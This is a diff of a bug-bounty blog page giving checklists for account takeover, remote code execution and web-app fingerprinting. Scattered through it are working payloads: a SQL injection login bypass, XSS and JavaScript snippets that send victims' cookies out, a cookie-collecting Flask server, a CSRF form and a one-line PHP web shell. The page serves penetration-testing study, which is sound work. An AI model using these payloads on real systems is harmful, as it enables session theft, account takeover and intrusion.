@@ -1,141 +1,151 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <title>Bugbounty Resources</title>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-    <meta name="description" content="This post contains Bugbounty Resources, Account Takeover Checklist, Remote Code/Command Execution (RCE) Checklist, Web Applications Fingerprinting tools, 403-bypass">
-    <meta name="keywords" content="hackerwasii, cybersecurity, penetration testing" />
-    <link rel="canonical" href="https://www.hackerwasii.com/posts/active-directory-resources/" />
-    <link rel="stylesheet" href="../../assets/style.css" />
-    <link rel="stylesheet" href="../../style.css" />
-    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../../img/apple-touch-icon-144-precomposed.png" />
-    <link rel="shortcut icon" href="../../img/favicon.png" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image" content="https://www.hackerwasii.com/img/cover.png" />
-    <meta name="twitter:title" content="Bugbounty Resources 📚" />
-    <meta name="twitter:description" content="This post contains Bugbounty Resources, Account Takeover Checklist, Remote Code/Command Execution (RCE) Checklist, Web Applications Fingerprinting tools, 403-bypass">
-    <meta name="og:title" content="Bugbounty Resources 📚" />
-    <meta name="og:description" content="This post contains Bugbounty Resources, Account Takeover Checklist, Remote Code/Command Execution (RCE) Checklist, Web Applications Fingerprinting tools, 403-bypass">
-    <meta property="og:type" content="article" />
-    <meta property="og:url" content="https://www.hackerwasii.com/posts/bugbounty-resources/" />
-    <meta property="og:image" content="https://www.hackerwasii.com/img/cover.png" />
-    <meta property="article:section" content="posts" />
-    <meta property="article:published_time" content="2022-09-09T00:00:00&#43;00:00" />
-    <meta property="article:modified_time" content="2022-09-09T00:00:00&#43;00:00" />
-    <meta property="og:site_name" content="hackerwasii" />
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0PCVFG8BNK"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-  
-      function gtag() {
-        dataLayer.push(arguments);
-      }
-      gtag('js', new Date());
-  
-      gtag('config', 'G-0PCVFG8BNK');
-    </script>
-    <!-- google Ads -->
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9670252621494000" crossorigin="anonymous"></script>
+  <title>Bugbounty Resources 2022📚🐞 - Waseem Akram</title>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="description" content="This post contains Bugbounty Resources, Account Takeover Checklist, Remote Code/Command Execution (RCE) Checklist, Web Applications Fingerprinting tools, 403-bypass">
+  <meta name="keywords" content="hackerwasii, cybersecurity, penetration testing, bugbounty-resources, bugbounty, bugcrowd, hackerone, twitter, google, microsoft" />
+  <link rel="canonical" href="https://www.hackerwasii.com/posts/bugbounty-resources/" />
+  <link rel="stylesheet" href="../../assets/style.css" />
+  <link rel="stylesheet" href="../../style.css" />
+  <link rel="manifest" href="../../assets/manifest.json">
+  <meta name="theme-color" content="#5616C4"/>
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../../img/apple-touch-icon-144-precomposed.png" />
+  <link rel="shortcut icon" href="../../img/favicon.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://www.hackerwasii.com/img/cover.png" />
+  <meta name="twitter:title" content="Bugbounty Resources 📚" />
+  <meta name="twitter:description" content="This post contains Bugbounty Resources, Account Takeover Checklist, Remote Code/Command Execution (RCE) Checklist, Web Applications Fingerprinting tools, 403-bypass">
+  <meta name="og:title" content="Bugbounty Resources 📚" />
+  <meta name="og:description" content="This post contains Bugbounty Resources, Account Takeover Checklist, Remote Code/Command Execution (RCE) Checklist, Web Applications Fingerprinting tools, 403-bypass">
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://www.hackerwasii.com/posts/bugbounty-resources/" />
+  <meta property="og:image" content="https://www.hackerwasii.com/img/cover.png" />
+  <meta property="article:section" content="posts" />
+  <meta property="article:published_time" content="2022-09-09T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2022-09-09T00:00:00&#43;00:00" />
+  <meta property="og:site_name" content="hackerwasii" />
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0PCVFG8BNK"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
+
+    gtag('config', 'G-0PCVFG8BNK');
+  </script>
+  <!-- google Ads -->
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9670252621494000"
+    crossorigin="anonymous"></script>
 </head>
+
 <body class="">
-    <div class="container">
-        <!-- ================== Header Start ================= -->
-        <header class="header">
-            <span class="header__inner">
-              <a href="https://www.hackerwasii.com/" class="logo" style="text-decoration: none;">
-                <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
-                    <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
-                  </svg>
-                </span>
-                <span class="logo__text">wasii/</span>
-                <span class="logo__text" style="color:red">posts/</span>
-                <span class="logo__cursor"></span>
-              </a>
-              <span class="header__right">
-                <nav class="menu">
-                  <ul class="menu__inner menu__inner--desktop">
-                    <li><a href="../../resume">📄 resume</a></li>
-                    <li><a href="../../posts">📚 blog</a></li>
-                    <li><a href="../../whoami">🔎 whoami </a></li>
-                    <li><a href="../../resources">🚀 resources</a></li>
-                  </ul>
-      
-                  <ul class="menu__inner menu__inner--mobile">
-                    <li><a href="../../resume">📄 resume</a></li>
-                    <li><a href="../../posts">📚 blog</a></li>
-                    <li><a href="../../whoami">🔎 whoami </a></li>
-                    <li><a href="../../resources">🚀 resources</a></li>
-                  </ul>
-                </nav>
-                <span class="menu-trigger">
-                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                    <path d="M0 0h24v24H0z" fill="none" />
-                    <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
-                  </svg>
-                </span>
-                <span class="theme-toggle">
-                  <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"
-                    xmlns="http://www.w3.org/2000/svg">
-                    <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  <div class="container">
+    <!-- ================== Header Start ================= -->
+    <header class="header">
+      <span class="header__inner">
+        <a href="https://www.hackerwasii.com/" class="logo" style="text-decoration: none;">
+          <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+              <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+            </svg>
+          </span>
+          <span class="logo__text">wasii/</span>
+          <span class="logo__text" style="color:red">posts/</span>
+          <span class="logo__cursor"></span>
+        </a>
+        <span class="header__right">
+          <nav class="menu">
+            <ul class="menu__inner menu__inner--desktop">
+              <li><a href="../../resume">📄 resume</a></li>
+              <li><a href="../../posts">📚 blog</a></li>
+              <li><a href="../../whoami">🔎 whoami </a></li>
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+
+            <ul class="menu__inner menu__inner--mobile">
+              <li><a href="../../resume">📄 resume</a></li>
+              <li><a href="../../posts">📚 blog</a></li>
+              <li><a href="../../whoami">🔎 whoami </a></li>
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+          </nav>
+          <span class="menu-trigger">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+              <path d="M0 0h24v24H0z" fill="none" />
+              <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+            </svg>
+          </span>
+          <span class="theme-toggle">
+            <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"
+              xmlns="http://www.w3.org/2000/svg">
+              <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
         3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
         13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z" />
-                  </svg>
-                </span>
-              </span>
-            </span>
-          </header>
-          <!-- ================== Header End ================= -->
-          <div class="content">
-            <div class="post">
-                <h1 class="post-title">Bugbounty Resources 📚🐞</h1>
-                <div class="post-meta">
-                    <span class="post-date">27-09-2022</span>
-                </div>
-                <span class="post-tags">
-                    <a href="../../tags/active-directory/index.html">#active directory</a>&nbsp;
-                    <a href="../../tags/pentesting/index.html">#pentesting</a>&nbsp;
-                    <a href="../../tags/labs/index.html">#labs</a>&nbsp;
-                    <a href="../../tags/infosec/index.html">#infosec</a>&nbsp;
-                </span>
-                <div class="post-content">
-                    <p>This post contains Bugbounty Resources to find vulnerabilities in web applications.</p>
-                    <h2 id="account-takeover">Account Takeover Checklist</h2>
-                    <ul>
-                      <li><h3 id="login">login:</h3>
-                        <ul>
-                          <li>check if you are able to brute force the password</li>
-                          <li>Test for OAuth misconfigurations</li>
-                          <li>check if you are able to bruteforce the login OTP</li>
-                          <li>check for JWT mesconfigurations</li>
-                          <li>Test for SQL injection to bypass authentication. <br><code>admin" or 1=1;--</code></li>
-                          <li>check if the application validates the OTP or Token</li>
-                        </ul>
-                      </li>
-                      <li><h3 id="password-reset">password reset:</h3>
-                        <ul>
-                          <li>check if you are able to brute force the password reset OTP.</li>
-                          <li>test for token predectability.</li>
-                          <li>test for JWT misconfigurations.</li>
-                          <li>check if the password reset endpoint is vulnerable to IDOR.</li>
-                          <li>check if the password reset endpoint is vulnerable to Host Header injection.</li>
-                          <li>check if the password reset endpoint is leaking the token or OTP in the HTTP response.</li>
-                          <li>check if the application validates the OTP or Token.</li>
-                          <li>test for HTTP parameter Pollution (HPP).</li>
-                        </ul>
-                      </li>
-                      <li><h3 id="xss-to-account-takeover">XSS to Account Takeover:</h3>
-                        <ul>
-                          <li>if the application does not use auth token or you can't access the cookies because the "HttpOnly" flag, you can obtain the CSRF token and craft a request to change the user's email or password</li>
-                          <li>try to exfiltrate the cookies</li>
-                          <li>try to exfiltrate the Auth Token</li>
-                          <li>if the cookie's "domain" attribute is set, search for xss in the subdomains and use it to exfiltrate the cookies PoC Example:</li>
-                            <div class="highlight">
-                              <pre tabindex="0"
-                                  style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="fallback">&lt;script&gt; 
+            </svg>
+          </span>
+        </span>
+      </span>
+    </header>
+    <!-- ================== Header End ================= -->
+    <div class="content">
+      <div class="post">
+        <h1 class="post-title">Bugbounty Resources 📚🐞</h1>
+        <div class="post-meta">
+          <span class="post-date">27-09-2022</span>
+        </div>
+        <span class="post-tags">
+          <a href="../../tags/active-directory/index.html">#active directory</a>&nbsp;
+          <a href="../../tags/pentesting/index.html">#pentesting</a>&nbsp;
+          <a href="../../tags/labs/index.html">#labs</a>&nbsp;
+          <a href="../../tags/infosec/index.html">#infosec</a>&nbsp;
+        </span>
+        <div class="post-content">
+          <p>This post contains Bugbounty Resources to find vulnerabilities in web applications.</p>
+          <h2 id="account-takeover">Account Takeover Checklist</h2>
+          <ul>
+            <li>
+              <h3 id="login">login:</h3>
+              <ul>
+                <li>check if you are able to brute force the password</li>
+                <li>Test for OAuth misconfigurations</li>
+                <li>check if you are able to bruteforce the login OTP</li>
+                <li>check for JWT mesconfigurations</li>
+                <li>Test for SQL injection to bypass authentication. <br><code>admin" or 1=1;--</code></li>
+                <li>check if the application validates the OTP or Token</li>
+              </ul>
+            </li>
+            <li>
+              <h3 id="password-reset">password reset:</h3>
+              <ul>
+                <li>check if you are able to brute force the password reset OTP.</li>
+                <li>test for token predectability.</li>
+                <li>test for JWT misconfigurations.</li>
+                <li>check if the password reset endpoint is vulnerable to IDOR.</li>
+                <li>check if the password reset endpoint is vulnerable to Host Header injection.</li>
+                <li>check if the password reset endpoint is leaking the token or OTP in the HTTP response.</li>
+                <li>check if the application validates the OTP or Token.</li>
+                <li>test for HTTP parameter Pollution (HPP).</li>
+              </ul>
+            </li>
+            <li>
+              <h3 id="xss-to-account-takeover">XSS to Account Takeover:</h3>
+              <ul>
+                <li>if the application does not use auth token or you can't access the cookies because the "HttpOnly"
+                  flag, you can obtain the CSRF token and craft a request to change the user's email or password</li>
+                <li>try to exfiltrate the cookies</li>
+                <li>try to exfiltrate the Auth Token</li>
+                <li>if the cookie's "domain" attribute is set, search for xss in the subdomains and use it to exfiltrate
+                  the cookies PoC Example:</li>
+                <div class="highlight">
+                  <pre tabindex="0"
+                    style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="fallback">&lt;script&gt; 
   /*
   this script will create a hidden &lt;img&gt; element 
   when the browser tries to load the image the victim's cookies 
@@ -147,16 +157,18 @@
   document.body.appendChild(new_img);
 &lt;/script&gt;
 </code></pre>
-                          </div>
-                        </ul>
-                      </li>
-                      <li><h3 id="csrf-to-account-takeover">CSRF to Account Takeover:</h3>
-                         <ul>
-                          <li>check if the email update endpoint is vulnerable to CSRF</li>
-                          <li>check if the password update endpoint is vulnerable to CSRF</li>
-                          <li>PoC Example:</li>
-                            <div class="highlight">
-                              <pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="fallback">&lt;html&gt;
+                </div>
+              </ul>
+            </li>
+            <li>
+              <h3 id="csrf-to-account-takeover">CSRF to Account Takeover:</h3>
+              <ul>
+                <li>check if the email update endpoint is vulnerable to CSRF</li>
+                <li>check if the password update endpoint is vulnerable to CSRF</li>
+                <li>PoC Example:</li>
+                <div class="highlight">
+                  <pre tabindex="0"
+                    style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="fallback">&lt;html&gt;
   &lt;head&gt;
     &lt;title&gt;CSRF PoC&lt;/title&gt;
   &lt;/head&gt;
@@ -171,22 +183,25 @@
   &lt;/body&gt;
   &lt;/html&gt;
 </code></pre>
-                         </ul>
-                      </li>
-                      <li><h3 id="idor">IDOR to Account Takerover</h3>
-                        <ul>
-                          <li>checck if the email update endpoint is vulnerable to IDOR</li>
-                          <li>check if the password change endpoint is vulnerable to IDOR</li>
-                          <li>check if the password reset endpoint vulnerable to IDOR</li>
-                        </ul>
-                      </li>
-                      <li><h3 id="subdomain-takeover">subdomain takeover:</h3>
-                        <ul>
-                          <li>first-order: check if you can takeover xyz.example.com, you can host any malicious code to steal users info or cookies</li>
-                          <li>PoC Example</li>
-                          <div class="highlight">
-                            <pre tabindex="0"
-                                style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="fallback">#python
+              </ul>
+            </li>
+            <li>
+              <h3 id="idor">IDOR to Account Takerover</h3>
+              <ul>
+                <li>checck if the email update endpoint is vulnerable to IDOR</li>
+                <li>check if the password change endpoint is vulnerable to IDOR</li>
+                <li>check if the password reset endpoint vulnerable to IDOR</li>
+              </ul>
+            </li>
+            <li>
+              <h3 id="subdomain-takeover">subdomain takeover:</h3>
+              <ul>
+                <li>first-order: check if you can takeover xyz.example.com, you can host any malicious code to steal
+                  users info or cookies</li>
+                <li>PoC Example</li>
+                <div class="highlight">
+                  <pre tabindex="0"
+                    style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="fallback">#python
 #!/usr/bin/python3
 from flask import *
 app = Flask(__name__)
@@ -198,11 +213,13 @@ def cookie_sniffer():
 if __name__ == '__main__':
     app.run(port=80)
 </code></pre>
-                         <li>second-order (broken link hijacking): if you found a broken link in a webpage (https://nonexistentlink.com/app.js) and you can takeover this domain, you can host any malicious javascript file and use it to steal users info or cookies</li>
-                         <li>PoC Example</li>
-                          <div class="highlight">
-                              <pre tabindex="0"
-                                  style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="fallback">//javascript
+                  <li>second-order (broken link hijacking): if you found a broken link in a webpage
+                    (https://nonexistentlink.com/app.js) and you can takeover this domain, you can host any malicious
+                    javascript file and use it to steal users info or cookies</li>
+                  <li>PoC Example</li>
+                  <div class="highlight">
+                    <pre tabindex="0"
+                      style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="fallback">//javascript
   user_cookies = {
     "cookies": document.cookie
 }
@@ -210,41 +227,244 @@ var xhttp = new XMLHttpRequest();
 xhttp.open("POST", "/store-cookies", true);
 xhttp.send(JSON.stringify(user_cookies));
 </code></pre>
-                          </div>
-                        </ul>
-                      </li>
-                    </ul>
-                    <h2 id="remote-code-execution">Remote Code/Command Execution (RCE) Checklist</h2>
-                    <ul>
-                      <li><h3 id="ssrf-to-rce">Server Side Request Forgery (SSRF) to RCE:</h3>
-                        <ul>
-                          <li>if you found an SSRF try to escalate it to RCE by interacting with internal services, to do this you can craft a Gopher payload to interact with services like MySQL, you can use <a target="_blank" href="https://github.com/tarunkant/Gopherus">Gopherus</a></li>
-                        </ul>
-                      </li>
-                      <li><h3 id="file-uplode-to-rce">File Upload to RCE:</h3>
-                        <ul>
-                          <li>if you found an unrestricted file upload vulnerability try to upload a malicious file to get a reverse shell.</li>
-                          <li>PoC Example:</li>
-                          <div class="highlight">
-                              <pre tabindex="0"
-                                  style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="fallback">#php
+                  </div>
+              </ul>
+            </li>
+          </ul>
+          <h2 id="remote-code-execution">Remote Code/Command Execution (RCE) Checklist</h2>
+          <ul>
+            <li>
+              <h3 id="ssrf-to-rce">Server Side Request Forgery (SSRF) to RCE:</h3>
+              <ul>
+                <li>if you found an SSRF try to escalate it to RCE by interacting with internal services, to do this you
+                  can craft a Gopher payload to interact with services like MySQL, you can use <a target="_blank"
+                    href="https://github.com/tarunkant/Gopherus">Gopherus</a></li>
+              </ul>
+            </li>
+            <li>
+              <h3 id="file-uplode-to-rce">File Upload to RCE:</h3>
+              <ul>
+                <li>if you found an unrestricted file upload vulnerability try to upload a malicious file to get a
+                  reverse shell.</li>
+                <li>PoC Example:</li>
+                <div class="highlight">
+                  <pre tabindex="0"
+                    style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="fallback">#php
 &lt;?php system($_GET["cmd"]);?&gt;
 </code></pre>
-                          </div>
-                        </ul>
-                      </li>
-                    </ul>
-
                 </div>
-            </div>
-          </div>
-          <!-- ================== Footer Section ================= -->
+              </ul>
+            </li>
+            <li>
+              <h3 id="dependency-confusion-attack">Dependency Confusion Attack:</h3>
+              <ul>
+                <li>Search for packages that may be used internally by your target, then register a malicious public
+                  package with the same name, you can use<a href="https://github.com/visma-prodsec/confused"
+                    target="_blank"> confused</a> tool.</li>
+              </ul>
+            </li>
+            <li>
+              <h3 id="ssti-to-rce">Server Side Template Injection (SSTI) to RCE:</h3>
+              <ul>
+                <li>if you found and SSTI you can exploit it with <a href="https://github.com/epinna/tplmap"
+                    target="_blank">tplmap</a> to get an RCE</li>
+              </ul>
+            </li>
+            <li>
+              <h3 id="sql-to-rce">SQL Injection To RCE:</h3>
+              <ul>
+                <li>if you found an SQL injection, you can craft a special query to write an arbitrary file on the
+                  system, <a
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#shell"
+                    target="_blank">SQL Injection shell</a>.</li>
+              </ul>
+            </li>
+            <li>
+              <h3 id="latex-to-rce">Latex Injection To RCE:</h3>
+              <ul>
+                <li>if you found a web-based Latex Compiler, test If it is vulnerable to RCE, Latex to <a
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection#command-execution"
+                    target="_blank">command execution</a>.</li>
+              </ul>
+            </li>
+            <li>
+              <h3 id="lfi-to-rce">Local File Inclusion (LFI) to RCE:</h3>
+              <ul>
+                <li>if you found an LFI try to escalate it to RCE via these <a
+                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-procfd"
+                    target="_blank">methods</a> and you can automate the process using <a
+                    href="and you can automate the process using" target="_blank">liffy</a></li>
+              </ul>
+            </li>
+            <li>
+              <h3 id="insecure-to-rce">Insecure deserialization to RCE:</h3>
+              <ul>
+                <li>check if the application is vulnerable to Insecure deserialization</li>
+                <li>how to identify if the app is vulnerable:
+                  <ul>
+                    <li>try to find out the language used to build the application.</li>
+                    <li>learn about the methods used to serialize and deserialize data in this language.</li>
+                    <li>by analyzing the data that comes from the application you can identify the method.</li>
+                    <li>try to craft a special payload to get and RCE</li>
+                  </ul>
+                </li>
+                <li>check this <a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+                    target="_blank">cheatsheet</a></li>
+                <li><a href="https://github.com/PortSwigger/java-deserialization-scanner" target="_blank">Java
+                    Deserialization Scanner</a> : a Burp Suite plugin to detect and exploit Java deserialization
+                  vulnerabilities.</li>
+              </ul>
+            </li>
+          </ul>
+          <h2 id="webapp-fingerprinting-tools">Web Applications Fingerprinting tools</h2>
+          <ul>
+            <li>
+              <h3 id="wappaylzer">wappaylzer</h3>
+              <ul>
+                <li>you can use wappaylyzer extension for <a
+                    href="https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/" target="_blank">firefox</a> or <a
+                    href="https://chrome.google.com/webstore/search/wappalyzer" target="_blank">chrome</a> browsers for
+                  web apps fingerprinting.</li>
+              </ul>
+            </li>
+            <li>
+              <h3 id="builtwith">builtwith</h3>
+              <ul>
+                <li>you can use builtwith extension for <a
+                    href="https://addons.mozilla.org/en-US/firefox/addon/builtwith/" target="_blank">firefox</a> or <a
+                    href="https://chrome.google.com/webstore/detail/builtwith-technology-prof/dapjbgnjinbpoindlpdmhochffioedbn"
+                    target="_blank">chrome</a> browsers for web apps fingerprinting.</li>
+              </ul>
+            </li>
+            <li>
+              <h3 id="httpx">httpx</h3>
+              <ul>
+                <li>you can use <code>-web-server</code> and <code>-tech-detect</code> options</li>
+                <div class="highlight">
+                  <pre tabindex="0"
+                    style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="fallback">#bash
+# a single domain
+echo example.com | httpx -web-server -tech-detect
 
-          <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9670252621494000" crossorigin="anonymous"></script>
-          <!-- hackerwasii_sidebar_AdSense1_970x250_as -->
-          <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-9670252621494000" data-ad-slot="7942896634" data-ad-format="auto"></ins>
-          <script>
-          (adsbygoogle = window.adsbygoogle || []).push({});
+# a list of subdomins
+cat subdomains_list.txt | httpx -web-server -tech-detect
+
+httpx -l subdomains_list.txt -web-server -tech-detect
+</code></pre>
+                </div>
+              </ul>
+            </li>
+            <li>
+              <h3 id="aquatone">Aquatone</h3>
+              <ul>
+                <li><a href="https://github.com/michenriksen/aquatone">Aquatone</a>is a tool for visual inspection of
+                  websites across a large amount of hosts and is convenient for quickly gaining an overview of
+                  HTTP-based attack surface.</li>
+              </ul>
+              <div class="highlight">
+                <pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="fallback">#bash
+cat hosts.txt | aquatone
+</code></pre>
+              </div>
+            </li>
+            <li>
+              <h3 id="nuclei">nuclei</h3>
+              <ul>
+                <li><a href="https://github.com/projectdiscovery/nuclei">nuclei</a> project has a good list of <a
+                    href="https://github.com/projectdiscovery/nuclei-templates">templates</a> to fingerprint web apps.
+                </li>
+              </ul>
+              <div class="highlight">
+                <pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="fallback">#bash
+nuclei -t ~/nuclei-templates -tags tech -u https://example.com -c 200
+</code></pre>
+              </div>
+            </li>
+            <li>
+              <h3 id="whatweb">whatweb</h3>
+              <ul>
+                <li><a href="https://github.com/urbanadventurer/WhatWeb"></a> has an 1800 plugin to identify
+                  technologies, you can use it to fingerprint web apps</li>
+              </ul>
+              <div class="highlight">
+                <pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="fallback">#bash
+# a single host
+whatweb example.com
+
+# a list of hosts
+whatweb --input-file=hosts.txt
+</code></pre>
+              </div>
+            </li>
+            <li>
+              <h3 id="error-message">Error messages</h3>
+              <ul>
+                <li>you can identify technologies via error messages, if a web app does not handle errors, and you sent
+                  malformed data to the web app, this data will cause an error, and this error may reveal the back-end
+                  technology.</li>
+              </ul>
+              <div class="highlight">
+                <pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="fallback">#http
+POST / HTTP/1.1
+Host: example.com
+User-Agent: curl/7.74.0
+Accept: */*
+Content-type: application/json
+Content-Length: 8
+
+{"test":d
+</code></pre>
+              </div>
+              you can enumerate the web app endpoints and start fuzzing them with different http methods, http headers,
+              and body
+              <ul>
+                <li>fuzzing http methods</li>
+              </ul>
+              <div class="highlight">
+                <pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="fallback">#http
+METHOD /ENDPOINT HTTP/1.1
+Host: example.com
+User-Agent: curl/7.74.0
+Accept: */*
+</code></pre>
+              </div>
+              <div class="highlight">
+                <pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="fallback">#bash
+ffuf -w http_methods.txt:METHOD -w endpoints.txt:ENDPOINT -request http_request.txt
+</code></pre>
+              </div>
+              <ul>
+                <li>fuzzing http headers</li>
+              </ul>
+              <div class="highlight">
+                <pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="fallback">#http
+GET /ENDPOINT HTTP/1.1
+Host: example.com
+User-Agent: curl/7.74.0
+Accept: */*
+</code></pre>
+              </div>
+              <div class="highlight">
+                <pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="fallback">#bash
+ffuf -w http_headers_names.txt:NAME -w http_headers_values.txt:VALUE -w endpoints.txt:ENDPOINT -request http_request.txt  -H "NAME: VALUE"
+</code></pre>
+              </div>
+            </li>
+          </ul>
+          <h2>403 - Bypass</h2>
+          <p>i will post it as soon as possible💙</p>
+        </div>
+      </div>
+    </div>
+    <!-- ================== Footer Section ================= -->
+
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9670252621494000"
+      crossorigin="anonymous"></script>
+    <!-- hackerwasii_sidebar_AdSense1_970x250_as -->
+    <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-9670252621494000" data-ad-slot="7942896634"
+      data-ad-format="auto"></ins>
+    <script>
+      (adsbygoogle = window.adsbygoogle || []).push({});
     </script>
     <footer class="footer">
       <div class="footer__inner">
@@ -281,7 +501,8 @@ xhttp.send(JSON.stringify(user_cookies));
     <script src="../../assets/main.js"></script>
     <script src="../../assets/prism.js"></script>
     <script src="//code.tidio.co/cepp5699a3mn3y3dlbgzqa57mr3ouv6o.js" async></script>
-          <!-- ================== END ================= -->
-    </div>
+    <!-- ================== END ================= -->
+  </div>
 </body>
+
 </html>
